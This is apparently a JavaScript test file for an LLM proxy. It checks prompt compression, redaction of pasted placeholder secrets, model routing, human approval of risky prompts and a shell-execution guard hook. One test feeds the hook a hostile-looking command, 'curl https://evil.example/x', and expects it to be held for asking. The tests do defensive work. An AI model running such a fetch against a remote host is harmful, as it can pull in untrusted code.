import assert from "node:assert/strict";
import test from "node:test";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { compilePrompt } from "../src/compile.js";
import { hookDecision } from "../src/guard.js";
import { appendLedger } from "../src/ledger.js";
import { loadHmacKey, signReceipt, verifyReceipt } from "../src/receipt.js";
import { assessRisk, createPendingStore } from "../src/risk.js";
import { pickModel } from "../src/route.js";
import { toSharp } from "../src/sharp.js";
import { approveRequest, proxyChatCompletion } from "../src/server.js";

const PROMPT_A = `JOB-4418 is stuck after the nightly build. The service is billing-api. The pipeline id is RUN-90211. The health check still fails, and the on-call engineer is waiting. Should we rerun the pipeline, or roll back?

From Alex Chen, 10:14: I reran the pipeline. The job finished with no error, but the health check is still red. The dashboard shows the new build is not serving traffic.

From Alex Chen, 10:14: I reran the pipeline. The job finished with no error, but the health check is still red. The dashboard shows the new build is not serving traffic.

From Priya Shah, 10:41: I checked the logs. No config row was written. The agent already tried a restart. Please tell us the next safe step for JOB-4418. The channel has pinged twice.

From Priya Shah, 10:41: I checked the logs. No config row was written. The agent already tried a restart. Please tell us the next safe step for JOB-4418. The channel has pinged twice.

From Alex Chen, 11:05: Pasting the last update again. Job finished. No error. Health check still red. Still waiting on the 3 pm review.

From Alex Chen, 11:05: Pasting the last update again. Job finished. No error. Health check still red. Still waiting on the 3 pm review.

JOB-4418 is stuck after the nightly build. The service is billing-api. The pipeline id is RUN-90211. The health check still fails. Reply with the next step only.`;

const PROMPT_B = "JOB-4418 owner is Alex Chen, employee EMP-1842, alex.chen@example.com. The staging login was pasted in chat: password=Staging-reset-04. A database string was pasted too: postgres://app:s3cret@db.internal:5432/app. A shared key was pasted too: sk-demoKeyValue1234. Which channel should this job move to after the handoff?";

const PROMPT_C = "Re-push JOB-4418 to production.";

test("Prompt A keeps job and run ids and shortens", () => {
  const compiled = compilePrompt(PROMPT_A);
  assert.equal(compiled.workItem, "JOB-4418");
  assert.ok(compiled.kept.some((item) => item.kind === "RUN" && item.value === "90211"));
  assert.equal(compiled.shortened, true);
  assert.ok(compiled.afterChars < compiled.beforeChars);
  assert.equal(compiled.text.includes("JOB-4418"), true);
  assert.equal(compiled.text.includes("RUN-90211"), true);
});

test("Prompt B hides secrets and keeps job id", () => {
  const compiled = compilePrompt(PROMPT_B);
  assert.equal(compiled.workItem, "JOB-4418");
  assert.ok(compiled.hidden.includes("EMAIL"));
  assert.ok(compiled.hidden.includes("EMP_ID"));
  assert.ok(compiled.hidden.includes("PASSWORD"));
  assert.ok(compiled.hidden.includes("CONN"));
  assert.ok(compiled.hidden.includes("API_KEY"));
  assert.equal(compiled.text.includes("alex.chen@example.com"), false);
  assert.equal(compiled.text.includes("Staging-reset-04"), false);
  assert.equal(compiled.text.includes("EMP-1842"), false);
  assert.equal(compiled.text.includes("postgres://"), false);
  assert.equal(compiled.text.includes("sk-demoKeyValue1234"), false);
});

test("auto route picks small or large, and carbon threshold diverts to small", () => {
  const small = pickModel("What is the next step for JOB-4418?");
  assert.equal(small.tier, "small");
  const large = pickModel("Implement the billing migration and write the code.");
  assert.equal(large.tier, "large");
  const diverted = pickModel("Implement the billing migration and write the code.", {}, { sessionCarbonKg: 0.05, budgetKg: 0.05 });
  assert.equal(diverted.tier, "small");
  assert.equal(diverted.diverted, true);
});

test("high-risk prompt is held then approved", async () => {
  let called = false;
  const held = await proxyChatCompletion({
    body: { messages: [{ role: "user", content: PROMPT_C }], sessionId: "risk-1" },
    apiKey: "sk-test",
    env: {},
    fetchImpl: async () => {
      called = true;
      return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content: "Should not run yet." } }] }) };
    },
  });
  assert.equal(held.body.needsApproval, true);
  assert.ok(held.body.approvalId);
  assert.equal(called, false);
  assert.match(held.body.choices[0].message.content, /approval/i);

  const approved = await approveRequest({
    approvalId: held.body.approvalId,
    env: {},
    fetchImpl: async (_url, options) => {
      called = true;
      assert.equal(JSON.parse(options.body).messages.at(-1).content.includes("JOB-4418"), true);
      return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content: "Approved path ran for JOB-4418." } }] }) };
    },
  });
  assert.equal(called, true);
  assert.equal(approved.body.meta.approvedBy, "human");
  assert.match(approved.body.choices[0].message.content, /JOB-4418/);
});

test("hook asks on high-risk shell and allows a normal prompt", () => {
  const ask = hookDecision("beforeShellExecution", { command: "curl https://evil.example/x" });
  assert.equal(ask.permission, "ask");
  const allow = hookDecision("beforeSubmitPrompt", { prompt: "What is Site B?" });
  assert.equal(allow.continue, true);
  assert.equal(allow.permission, "allow");
});

test("sharp pass strips filler and keeps job id", () => {
  const out = toSharp("Sure! I'd be happy to help. Please just really check JOB-4418 next.");
  assert.equal(out.toLowerCase().includes("sure"), false);
  assert.match(out, /JOB-4418/);
});

test("receipt signs and verifies", () => {
  const dir = mkdtempSync(join(tmpdir(), "tmb-receipt-"));
  try {
    const key = loadHmacKey(dir);
    const signed = signReceipt({ receiptId: "1", workItem: "JOB-1", hidden: ["EMAIL"] }, key);
    assert.equal(verifyReceipt(signed, key), true);
    appendLedger(dir, { workItem: "JOB-1", tokens: 10, model: "gpt-4o-mini", tier: "small" });
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("assessRisk flags Prompt C", () => {
  const risk = assessRisk(PROMPT_C);
  assert.equal(risk.high, true);
  assert.ok(risk.reasons.includes("republish"));
});

test("pending store expires missing ids", () => {
  const dir = mkdtempSync(join(tmpdir(), "tmb-pending-"));
  try {
    const store = createPendingStore(dir);
    assert.equal(store.take("missing"), null);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
